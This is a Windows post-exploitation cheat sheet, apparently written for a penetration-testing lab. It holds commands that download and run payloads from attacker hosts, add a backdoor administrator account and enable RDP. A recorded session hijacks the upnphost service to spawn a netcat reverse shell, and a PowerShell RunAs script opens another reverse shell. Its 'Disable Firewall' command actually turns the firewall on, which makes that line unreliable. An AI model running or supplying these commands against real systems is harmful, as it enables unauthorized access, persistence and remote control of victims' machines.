# Windows

## Download a file 
```
# CertUtil
certutil.exe -urlcache -split -f http://10.11.0.58:8080/payload.exe 

# VBScript
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
cscript dl.vbs "http://10.11.0.92:8080/fgdump.exe" ".\fgdump.exe"

# PowerShell
powershell.exe "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8:8000/payload.exe')"
```

## Add User
```
net user acuriousmoose abbarocks /ADD
net localgroup administrators acuriousmoose /ADD
net localgroup "Remote Desktop Users" acuriousmoose /ADD
```

## Disable Firewall
`netsh advfirewall set allprofiles state on`

## Enable RDP
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

## Configure Network with DHCP, DNS and WINNS
```
netsh interface ip set address "Local Area Connection" dhcp
netsh interface ip set wins "Local Area Connection" static 192.168.0.200
netsh interface ip set dns "Local Area Connection" static 192.168.0.200
```

## Manually Configure Network
`netsh interface ip set address name="Local Area Connection" static 192.168.0.100 255.255.255.0 192.168.0.1 1`

## Compile Windows exe from Kali
`i686-w64-mingw32-gcc -o Hosted/payload.exe 21652.cpp`

## Taking over a Service
```
C:\>accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

C:\>sc qc upnphost
sc qc upnphost
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : NT AUTHORITY\LocalService  

C:\=>sc config upnphost binpath= "C:\Inetpub\nc.exe 10.11.0.58 4444 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost binpath= "C:\Inetpub\nc.exe 10.11.0.58 4444 -e C:\WINDOWS\System32\cmd.exe"
[SC] ChangeServiceConfig SUCCESS

C:\=>sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost obj= ".\LocalSystem" password= ""
[SC] ChangeServiceConfig SUCCESS

C:\=>sc qc upnphost
sc qc upnphost
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Inetpub\nc.exe 10.11.0.58 4444 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem  

C:\=>sc config SSDPSRV start= auto
sc config SSDPSRV start= auto
[SC] ChangeServiceConfig SUCCESS

C:\=>net start SSDPSRV
net start SSDPSRV
The SSDP Discovery Service service is starting.
The SSDP Discovery Service service was started successfully.

C:\=>net start upnphost
net start upnphost

root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.0.58] from (UNKNOWN) [10.11.1.13] 3041                                          
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## Powershell RunAs
```
C:\HFS>echo $username = 'alice' > ra.ps1
echo $username = 'alice' > ra.ps1

C:\HFS>echo $password = 'aliceishere' >> ra.ps1
echo $password = 'aliceishere' >> ra.ps1

C:\HFS>echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> ra.ps1
echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> ra.ps1

C:\HFS>echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> ra.ps1                                                                                                 
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> ra.ps1                                                                                                        

C:\HFS>echo Start-Process -FilePath C:\Users\Bethany\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.11.0.92","443","-e","cmd.exe") -WorkingDirectory C:\Users\Bethany >> ra.ps1                     
echo Start-Process -FilePath C:\Users\Bethany\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.11.0.92","443","-e","cmd.exe") -WorkingDirectory C:\Users\Bethany >> ra.ps1                            

C:\HFS>more ra.ps1
more ra.ps1
$username = 'alice'
$password = 'aliceishere'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Bethany\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.11.0.92","443","-e","cmd.exe") -WorkingDirectory C:\Users\Bethany                                           

C:\HFS>powershell.exe -ExecutionPolicy ByPass -command "& {. C:\HFS\ra.ps1 }"
powershell.exe -ExecutionPolicy ByPass -command "& {. C:\HFS\ra.ps1 }"
```

